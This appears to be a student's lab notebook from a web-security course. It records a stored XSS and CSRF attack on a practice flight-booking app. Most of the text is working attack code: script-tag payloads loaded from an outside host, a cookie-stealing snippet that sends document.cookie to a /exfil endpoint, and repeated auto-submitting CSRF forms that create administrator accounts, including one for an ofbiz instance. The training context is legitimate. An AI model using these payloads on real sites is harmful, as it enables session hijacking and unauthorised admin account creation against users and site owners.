after registering an account notice the `type` field with `50` and being redirected to `/loginLogout`
![[Pasted image 20241125175823.png]]
send the `POST` request to `INTRUDER` and identify that `100` is a field that has different values - this is an administrator

- had to graba new post request and try again - make sure to `START ATTACK` from the payloads page
![[Pasted image 20241210221225.png]]
navigate to the `Book Flight` page with the `test:test` credentials

![[Pasted image 20241125180017.png]]
states that the admin will review
![[Pasted image 20241125180053.png]]

```bash
```js
<script src="http://192.168.45.155:8000/xss2.js"></script>
```
```




```bash
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.155:8000/xss2.js\'><\/script>');" />
```





```bash
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.155:8000/exfil?data=" + encodedCookie)
```







---------

#### Fresh restart

hosted `xss2.js` to get the administrator cookie
```js
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.155/exfil?data=" + encodedCookie)

```

submitted payload `<script src="http://192.168.45.155:8000/xss2.js"></script>` here after logging in with basic user `test:test` `http://screamin_firehawk/`

![[Pasted image 20241125195605.png]]
can see it processing
![[Pasted image 20241125195630.png]]
proof we have `xss`
![[Pasted image 20241125195651.png]]
going to hit `CANCEL ALL FLIGHTS` to not bog down the system

@ `http://screamin_firehawk/register` registering a user name `testing`

now we have the fields needed to create a `CSRF` attack - we just need to create a java payload and callthe payload
![[Pasted image 20241125195949.png]]
utilizing intruder we identifed the `type` field = `100` is when an admin user is created
![[Pasted image 20241125200114.png]]
however we are not authorized from this side of the web client
![[Pasted image 20241125200220.png]]



csrftest.html
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="/loginLogout" method="post" name="csrf">
    <input type="hidden" name="_token" value="LrJUEU2RNjESdh7G8ZeafIFsK1SzVgR1dRtNNoxY">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</body>
</html>
```

payload: `<script src="http://192.168.45.155:8000/csrftest.html"></script>`

submitting here in `booking`
![[Pasted image 20241125200930.png]]
showing that the payload is processing in `my flights`
![[Pasted image 20241125200953.png]]
now we wait for it to hit the `python3 server`

 hit the server
 ![[Pasted image 20241125201029.png]]
 - payload failed to execute and create `bugstwo` user

mine:
csrftest.html
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="/loginLogout" method="post" name="csrf">
    <input type="hidden" name="_token" value="LrJUEU2RNjESdh7G8ZeafIFsK1SzVgR1dRtNNoxY">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</body>
</html>
```
from course material what it should looks like:
```html
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();" >
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf" target="_blank">
    <input type="hidden" name="enabled">
    <input type="hidden" name="partyId">
    <input type="hidden" name="userLoginId" value="csrftest">
    <input type="hidden" name="currentPassword" value="password">
    <input type="hidden" name="currentPasswordVerify" value="password">
    <input type="hidden" name="passwordHint">
    <input type="hidden" name="requirePasswordChange" value="N">
    <input type="hidden" name="externalAuthId">
    <input type="hidden" name="securityQuestion">
    <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://ofbiz:8443/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
<input type="hidden" name="userLoginId" value="csrftest">
<input type="hidden" name="partyId">
<input type="hidden" name="groupId" value="SUPER">
<input type="hidden" name="fromDate_i18n">
<input type="hidden" name="fromDate">
<input type="hidden" name="thruDate_i18n">
<input type="hidden" name="thruDate">
  </form>
</body>
</html>
```
mine modified
`csrftest2.html`
payload: `<script src="http://192.168.45.155:8000/csrftest2.html"></script>`
```html
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();" >
  <form action="/loginLogout" method="post" name="csrf" enctype="multipart/form-data">
    <input type="hidden" name="_token" value="LrJUEU2RNjESdh7G8ZeafIFsK1SzVgR1dRtNNoxY">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
</body>
</html>
```
my payload but chatgpt fixed it 
`csrf3.html`
payload: `<script src="http://192.168.45.155:8000/csrftest3.html"></script>`
```html
<html onload="document.forms['csrf'].submit();">
<head>
  <form action="/loginLogout" method="POST" accept-charset="UTF-8" name="csrf" enctype="multipart/form-data">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</head>
</html>
```

recommended from discord
```html
<html>
<body onload="document.forms['pwn'].submit()">
<form method="POST" action="/loginLogout" accept-charset="UTF-8" name="pwn" enctype="multipart/form-data">
<input type="hidden" name="username" value="offsec"/>
<input type="hidden" name="password" value="offsec"/>
<input type="hidden" name="firstName" value="offsec"/>
<input type="hidden" name="lastName" value="offsec"/>
<input type="hidden" name="email" value="offsec@offsectest.local"/>
<input type="hidden" name="type" value="100"/>
<input type="hidden" name="dType" value="isRegister"/>
</form>
</body>
</html>
</html>```



```bash
<body onload="document.forms['name of the form here'].submit()">
<form method="POST" action="action here" accept-charset="UTF-8" name="name of the form" enctype="multipart/form-data">
<input type="hidden" name="username" value="username you like"/>
.......
```



`csrf4test.html`
`<script src="http://192.168.45.155:8000/csrftest4.js"></script>`
```bash
<html>
<body onload="document.forms['pwn'].submit()">
<form method="POST" action="http://localhost/loginLogout" accept-charset="UTF-8" name="pwn" enctype="multipart/form-data">
<input type="hidden" name="username" value="offsec"/>
<input type="hidden" name="password" value="offsec"/>
<input type="hidden" name="firstName" value="offsec"/>
<input type="hidden" name="lastName" value="offsec"/>
<input type="hidden" name="email" value="offsec@offsectest.local"/>
<input type="hidden" name="type" value="100"/>
<input type="hidden" name="dType" value="isRegister"/>
</form>
</body>
</html>
```

`csrf5.html`

`<script src="http://192.168.45.155:8000/csrf5.js"></script>`
```js
<html>
<head>
  <script>
    // This function submits the form automatically when the page loads
    function submitForm() {
      document.forms['csrf'].submit();
    }
  </script>
</head>
<body onload="submitForm();">
  <!-- Define the hidden form -->
  <form action="/loginLogout" method="POST" accept-charset="UTF-8" name="csrf" enctype="multipart/form-data" style="display:none;">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</body>
</html>

```

`csrf6.js`
`<script src="http://192.168.45.155:8000/csrf6.js"></script>`
```js
<html>
<head>
  <script>
    // This function submits the form automatically when the page loads
    function submitForm() {
      document.forms['csrf'].submit();
    }
  </script>
</head>
<body onload="submitForm();">
  <!-- Define the hidden form -->
  <form action="/loginLogout" method="POST" accept-charset="UTF-8" name="csrf" enctype="multipart/form-data" style="display:none;">
    <input type="hidden" name="_token" value="jr99Nn6ggdZgxtbSs89dxS2Vsn6Z9Nbxrb3sbph9">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</body>
</html>
```


`<script src="http://192.168.45.155:8000/csrflast.js"></script>`
```js
<html>
<body onload="document.forms['pwn'].submit()">
<form method="POST" action="/loginLogout" accept-charset="UTF-8" name="pwn" enctype="multipart/form-data">
  <input type="hidden" name="_token" value="jr99Nn6ggdZgxtbSs89dxS2Vsn6Z9Nbxrb3sbph9"/>
  <input type="hidden" name="username" value="offsec"/>
  <input type="hidden" name="password" value="offsec"/>
  <input type="hidden" name="firstName" value="offsec"/>
  <input type="hidden" name="lastName" value="offsec"/>
  <input type="hidden" name="email" value="offsec@offsectest.local"/>
  <input type="hidden" name="type" value="100"/>
  <input type="hidden" name="dType" value="isRegister"/>
</form>
</body>
</html>
```


reformat properly

```js
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF PoC</title>
  <script>
    // Automatically submit the form when the page loads
    function submitForm() {
      document.forms['csrf'].submit();
    }
  </script>
</head>
<body onload="submitForm();">
  <!-- Hidden form for CSRF attack -->
  <form 
    action="/loginLogout" 
    method="POST" 
    accept-charset="UTF-8" 
    name="csrf" 
    enctype="multipart/form-data" 
    style="display: none;">
    
    <!-- Hidden input fields -->
    <input type="hidden" name="_token" value="jr99Nn6ggdZgxtbSs89dxS2Vsn6Z9Nbxrb3sbph9">
    <input type="hidden" name="username" value="bugstwo">
    <input type="hidden" name="password" value="bugstwo">
    <input type="hidden" name="firstName" value="bugstwo">
    <input type="hidden" name="lastName" value="bugstwo">
    <input type="hidden" name="email" value="bugstwo@local.com">
    <input type="hidden" name="dtype" value="isRegister">
    <input type="hidden" name="type" value="100">
  </form>
</body>
</html>

```